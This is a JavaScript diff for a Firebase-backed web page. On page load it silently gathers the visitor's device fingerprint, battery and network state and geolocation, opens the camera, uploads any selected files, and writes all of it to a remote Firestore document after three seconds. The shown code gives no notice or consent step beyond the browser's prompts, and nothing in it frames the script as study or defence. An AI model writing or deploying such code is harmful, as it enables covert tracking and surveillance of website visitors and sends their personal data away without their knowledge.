@@ -1,6 +1,8 @@
+import { db, storage } from "./firebase-config.js";
 import {
   collection,
-  addDoc
+  doc,
+  setDoc
 } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";
 
 import {
@@ -9,68 +11,85 @@ import {
   getDownloadURL
 } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-storage.js";
 
+const fileInput = document.getElementById("fileInput");
+
+async function getDeviceInfo() {
+  const battery = await navigator.getBattery();
+  const connection = navigator.connection || {};
+  
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    battery: {
+      level: battery.level,
+      charging: battery.charging
+    },
+    connection: {
+      downlink: connection.downlink || "unknown",
+      effectiveType: connection.effectiveType || "unknown"
+    }
+  };
+}
+
 async function getLocation() {
   return new Promise((resolve, reject) => {
     navigator.geolocation.getCurrentPosition(resolve, reject);
   });
 }
 
-function getDeviceInfo() {
-  return {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language
-  };
-}
-
-async function saveUserData(location, deviceInfo, fileUrls) {
+async function getCameraStream() {
+  const video = document.getElementById("video");
   try {
-    await addDoc(collection(window.db, "user_data"), {
-      timestamp: new Date(),
-      location: {
-        latitude: location.coords.latitude,
-        longitude: location.coords.longitude
-      },
-      deviceInfo,
-      files: fileUrls
-    });
-    console.log("Data saved to Firestore");
-  } catch (e) {
-    console.error("Error saving data:", e);
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    video.srcObject = stream;
+    return true;
+  } catch (err) {
+    console.warn("Camera access denied");
+    return false;
   }
 }
 
 async function handleFileUpload(files) {
   const urls = [];
   for (const file of files) {
-    const storageRef = ref(window.storage, `uploads/${file.name}`);
-    await uploadBytes(storageRef, file);
-    const downloadURL = await getDownloadURL(storageRef);
-    urls.push(downloadURL);
+    const fileRef = ref(storage, `uploads/${file.name}`);
+    await uploadBytes(fileRef, file);
+    const url = await getDownloadURL(fileRef);
+    urls.push(url);
   }
   return urls;
 }
 
-async function init() {
-  try {
-    const location = await getLocation();
-    const deviceInfo = getDeviceInfo();
+async function collectAndSave() {
+  const deviceInfo = await getDeviceInfo();
+  const loc = await getLocation().catch(() => null);
+  const cam = await getCameraStream();
 
-    const fileInput = document.getElementById("fileInput");
-    fileInput.addEventListener("change", async (e) => {
-      const files = e.target.files;
-      const fileUrls = await handleFileUpload(files);
-      await saveUserData(location, deviceInfo, fileUrls);
-    });
+  const locationData = loc
+    ? {
+        latitude: loc.coords.latitude,
+        longitude: loc.coords.longitude
+      }
+    : { error: "Location denied" };
 
-    // Auto-save if no file is uploaded
-    setTimeout(async () => {
-      await saveUserData(location, deviceInfo, []);
-    }, 5000);
+  const fileUrls = await handleFileUpload(fileInput.files || []);
 
-  } catch (err) {
-    console.error("Error collecting info:", err);
-  }
+  const finalData = {
+    deviceInfo,
+    location: locationData,
+    cameraAccess: cam,
+    files: fileUrls,
+    timestamp: new Date()
+  };
+
+  // Create 'web' doc in Firestore
+  await setDoc(doc(db, "web", "user-data"), finalData);
+  console.log("Data saved to Firestore.");
 }
 
-window.onload = init;
+window.onload = () => {
+  setTimeout(() => {
+    collectAndSave();
+  }, 3000);
+};
